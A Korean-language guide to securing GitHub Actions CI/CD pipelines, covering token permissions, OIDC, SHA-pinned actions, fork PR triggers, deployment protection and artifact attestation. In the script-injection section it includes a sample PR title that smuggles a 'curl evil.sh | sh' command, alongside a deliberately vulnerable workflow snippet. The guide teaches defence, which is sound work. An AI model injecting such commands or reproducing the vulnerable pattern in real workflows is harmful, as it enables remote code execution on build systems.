# CI/CD 파이프라인 보안

CI 러너는 **소스 코드, 비밀값, 운영 배포 권한을 한곳에 모은 곳**입니다. 공격자에게는 운영 서버보다 CI가 더 쉬운 진입점일 수 있습니다. 예시는 GitHub Actions 기준이지만 원칙은 다른 CI에도 같습니다.

## 위협 모델

| 위협 | 경로 | 대응 |
| --- | --- | --- |
| 비밀값 유출 | 로그 출력, 포크 PR, 악성 서드파티 액션 | 최소 권한, OIDC, 포크 PR에 시크릿 미제공 |
| 서드파티 액션 변조 | 태그를 악성 커밋으로 옮김 | 커밋 SHA 고정, 락파일, 허용 목록 |
| 스크립트 인젝션 | PR 제목·브랜치 이름이 `run:`에 그대로 삽입 | 환경변수로 전달 |
| 권한 과다 | `GITHUB_TOKEN`의 쓰기 권한 | `permissions:` 명시 |
| 의존성 공급망 | 악성 패키지 버전 | lockfile, 업데이트 지연(cooldown), 리뷰 |
| 아티팩트 위조 | 빌드 후 이미지 바꿔치기 | 아티팩트 증명(attestation), 서명 검증 |

## 1. `GITHUB_TOKEN` 권한 최소화

```yaml
permissions:
  contents: read # 워크플로 기본값: 읽기만

jobs:
  release:
    permissions:
      contents: write # 이 잡만 릴리스 생성 권한
```

- 개인 계정의 새 저장소는 기본값이 제한(restricted, `contents`·`packages` 읽기)입니다. 조직 저장소는 조직·엔터프라이즈 설정을 따르므로 저장소 설정에서 확인합니다.
- `permissions`에 하나라도 적으면 **적지 않은 권한은 모두 `none`**이 됩니다. 필요한 권한을 빠짐없이 적습니다.
- 모든 권한을 끄려면 `permissions: {}`를 씁니다.

## 2. 장기 비밀값 대신 OIDC

클라우드 액세스 키를 시크릿에 저장하면 유출 시 만료 전까지 계속 쓸 수 있습니다. OIDC를 쓰면 클라우드가 GitHub이 발급한 단기 토큰을 검증하고 임시 자격 증명을 내줍니다.

```yaml
permissions:
  id-token: write # OIDC 토큰 요청 허용(다른 리소스 쓰기 권한은 주지 않음)
  contents: read

steps:
  - uses: aws-actions/configure-aws-credentials@v6
    with:
      role-to-assume: arn:aws:iam::123456789012:role/github-deploy
      aws-region: ap-northeast-2
```

- 클라우드 쪽 신뢰 정책에서 토큰의 `sub`(저장소, 브랜치, 환경)를 좁게 제한해야 의미가 있습니다. 예: `main` 브랜치 또는 `production` 환경만 허용.
- GCP는 `google-github-actions/auth@v3`를 씁니다.
- VPS에 SSH로 배포한다면 OIDC를 쓸 수 없으므로, **배포 전용 키**를 만들고 서버에서 해당 키가 할 수 있는 일을 제한합니다(전용 사용자, `authorized_keys`의 `command=` 제한 등).

## 3. 서드파티 액션 고정

태그(`@v4`)는 저장소 소유자가 다른 커밋으로 옮길 수 있습니다. 공식 문서는 전체 커밋 SHA 고정을 권장합니다.

```yaml
# 태그 대신 SHA. 주석으로 버전을 남겨 두면 Dependabot이 함께 갱신
- uses: actions/checkout@<40자리 커밋 SHA> # v7.0.1
```

| 방법 | 수준 | 비고 |
| --- | --- | --- |
| 메이저 태그 `@v7` | 낮음 | 편하지만 태그 이동에 취약. GitHub 공식 액션(`actions/*`)은 상대적으로 안전 |
| 커밋 SHA | 높음 | SHA가 포크가 아닌 원본 저장소의 커밋인지 확인 |
| 워크플로 락파일 | 높음 | `.github/workflows/actions.lock`. 간접 의존 액션까지 고정. **2026-10 공개 프리뷰** |
| 정책: SHA 고정 강제 | 강제 | 저장소·조직 설정에서 SHA로 고정하지 않은 액션을 실패 처리, 차단 목록(`!` 접두사) 지정 가능 |

- Dependabot은 `package-ecosystem: "github-actions"`로 액션 버전도 갱신합니다. 단, SHA로 고정한 액션에는 **보안 알림을 만들지 않으므로** 업데이트 PR을 꾸준히 받아야 합니다.
- 1인 개발이라면 "공식·검증된 게시자 액션은 메이저 태그, 그 외는 SHA" 정도로 시작해도 됩니다(경험칙).

## 4. 스크립트 인젝션 방지

`${{ }}` 식은 셸 스크립트가 만들어지기 **전에** 문자열로 치환됩니다. PR 제목에 `"; curl evil.sh | sh; "`가 있으면 그대로 실행됩니다.

```yaml
# 나쁜 예
- run: echo "${{ github.event.pull_request.title }}"

# 좋은 예: 환경변수로 넘기고 따옴표로 감싸기
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "$TITLE"
```

사용자가 조작할 수 있는 값: PR·이슈 제목과 본문, 코멘트, 브랜치 이름, 커밋 메시지, 작성자 이메일 등.

## 5. 포크 PR과 `pull_request_target`

| 트리거 | 실행 코드 | 시크릿·쓰기 권한 | 용도 |
| --- | --- | --- | --- |
| `pull_request` | PR의 코드 | 포크 PR에는 없음 | 테스트 등 일반 CI |
| `pull_request_target` | 기본 브랜치의 워크플로 | **있음** | 라벨 달기, 코멘트 등 PR 코드를 실행하지 않는 작업 |

- `pull_request_target`에서 PR의 코드를 체크아웃해 실행하면 외부인이 시크릿과 쓰기 권한을 얻습니다. 필요하지 않으면 쓰지 않습니다.
- 2025-12-08부터 `pull_request_target`의 워크플로 파일과 체크아웃 대상은 항상 기본 브랜치에서 가져옵니다.
- `actions/checkout` v7은 `pull_request_target`(및 PR로 시작된 `workflow_run`)에서 포크 PR 코드를 체크아웃하려 하면 기본적으로 거부합니다. 지원 중인 이전 메이저 태그에도 2026-07-20에 반영되었지만, SHA·패치 버전으로 고정한 경우에는 자동 적용되지 않습니다.

## 6. 운영 배포 보호

```yaml
jobs:
  deploy:
    environment: production # 이 환경의 시크릿과 보호 규칙 적용
```

| 기능 | Free·Pro·Team 플랜 사용 범위 |
| --- | --- |
| 환경별 시크릿 | 사용 가능 |
| 배포 브랜치·태그 제한(예: `main`만) | 공개 저장소, Pro·Team의 비공개 저장소 |
| 필수 승인자(Required reviewers), 대기 타이머 | **공개 저장소만**. 비공개 저장소는 Enterprise 필요 |

비공개 저장소에서 승인 단계가 필요하면 `workflow_dispatch`(수동 실행)나 태그 푸시를 운영 배포 트리거로 쓰는 것이 대안입니다.

```yaml
on:
  push:
    tags: ["v*"] # 태그를 푸시해야 운영 배포
  workflow_dispatch: # Actions 탭에서 수동 실행
```

## 7. 아티팩트 증명과 SLSA

빌드한 이미지가 "이 저장소의 이 워크플로에서 만들어졌다"는 서명된 증명을 남깁니다.

```yaml
permissions:
  contents: read
  packages: write
  id-token: write
  attestations: write

steps:
  # ... 이미지 빌드·푸시(build-push-action의 id: push)
  - uses: actions/attest@v4
    with:
      subject-name: ghcr.io/${{ github.repository }}
      subject-digest: ${{ steps.push.outputs.digest }}
      push-to-registry: true
```

```bash
# 검증
gh attestation verify oci://ghcr.io/OWNER/IMAGE:TAG -R OWNER/REPO
```

- 공개 저장소는 모든 플랜에서 쓸 수 있고, 비공개 저장소는 Enterprise Cloud가 필요합니다.
- `actions/attest-build-provenance`는 v4부터 `actions/attest`를 감싼 래퍼입니다.
- GitHub 문서 기준으로 증명만 생성하면 SLSA Build L2, 재사용 워크플로에서 빌드하면 L3에 해당합니다.

| SLSA Build 레벨 | 이름 | 의미 |
| --- | --- | --- |
| L0 | No guarantees | 보장 없음 |
| L1 | Provenance exists | 빌드 출처 정보가 있음 |
| L2 | Hosted build platform | 호스팅된 빌드 플랫폼이 출처에 서명 |
| L3 | Hardened builds | 빌드 간 격리, 서명 키를 빌드 단계에서 접근 불가 |

SLSA 현재 명세는 v1.2이며, Build Track에 더해 Source Track이 추가되었습니다.

## 8. 그 밖의 습관

| 항목 | 내용 |
| --- | --- |
| 로그 | 시크릿은 정확히 같은 값만 마스킹됩니다. base64 등으로 가공한 값은 별도 시크릿으로 등록하고, JSON에 여러 비밀값을 묶지 않습니다. `set -x`를 피합니다 |
| 자체 호스팅 러너 | 공개 저장소에서는 "거의 쓰지 말라"고 안내합니다. 누구나 연 PR이 내 서버에서 코드를 실행할 수 있습니다 |
| 의존성 설치 | `npm ci`처럼 lockfile을 그대로 쓰는 명령을 씁니다 |
| 브랜치 보호 | main에 CI 통과 필수, 강제 푸시 금지. 1인 개발이라도 실수 방지에 유효합니다 |
| 시크릿 순환 | 배포 키·토큰은 주기적으로 교체하고, 퇴사·외주 종료 시 즉시 폐기합니다 |

## 점검표

| 질문 |
| --- |
| 워크플로 최상단에 `permissions: contents: read`가 있는가 |
| 클라우드 배포에 장기 액세스 키 대신 OIDC를 쓰는가 |
| 서드파티 액션을 SHA로 고정하거나 Dependabot으로 관리하는가 |
| `run:`에 사용자 입력이 `${{ }}`로 직접 들어가지 않는가 |
| `pull_request_target`에서 PR 코드를 실행하지 않는가 |
| 운영 배포가 `main`·태그·수동 실행으로만 일어나는가 |

## 참고 자료

- [Secure use reference](https://docs.github.com/en/actions/reference/security/secure-use) - SHA 고정, 스크립트 인젝션, `pull_request_target`
- [Workflow syntax - permissions](https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax)
- [저장소 Actions 설정 - GITHUB_TOKEN 기본 권한](https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository)
- [OpenID Connect](https://docs.github.com/en/actions/concepts/security/openid-connect), [OIDC reference](https://docs.github.com/en/actions/reference/security/oidc)
- [Deployments and environments](https://docs.github.com/en/actions/reference/workflows-and-actions/deployments-and-environments) - 플랜별 보호 규칙
- [Dependabot options reference](https://docs.github.com/en/code-security/reference/supply-chain-security/dependabot-options-reference)
- [Artifact attestations](https://docs.github.com/en/actions/concepts/security/artifact-attestations), [사용 방법](https://docs.github.com/en/actions/how-tos/secure-your-work/use-artifact-attestations/use-artifact-attestations)
- 변경 공지: [SHA 고정 강제·차단 정책(2025-08-15)](https://github.blog/changelog/2025-08-15-github-actions-policy-now-supports-blocking-and-sha-pinning-actions/), [pull_request_target 변경(2025-11-07)](https://github.blog/changelog/2025-11-07-actions-pull_request_target-and-environment-branch-protections-changes/), [checkout v7 기본값(2026-06-18)](https://github.blog/changelog/2026-06-18-safer-pull_request_target-defaults-for-github-actions-checkout/), [워크플로 락파일 프리뷰(2026-10-14)](https://github.blog/changelog/2026-10-14-github-actions-workflow-lockfiles-in-public-preview/)
- [SLSA v1.2](https://slsa.dev/spec/v1.2/), [Build Track 레벨](https://slsa.dev/spec/v1.2/build-track-basics)

확인일: 2026-10-20 (권한·OIDC·SHA 고정·트리거 동작·플랜별 기능·증명·SLSA 레벨·액션 메이저 버전. 락파일은 프리뷰라 변경 가능)

관련: [환경변수 관리](../../Security/env-management.md), [OWASP Top 10](../../Security/owasp-top-10.md), [GitHub Actions](./github-action.md)

다음: [1인·소규모 도구 선택](./solo-dev-tools.md)
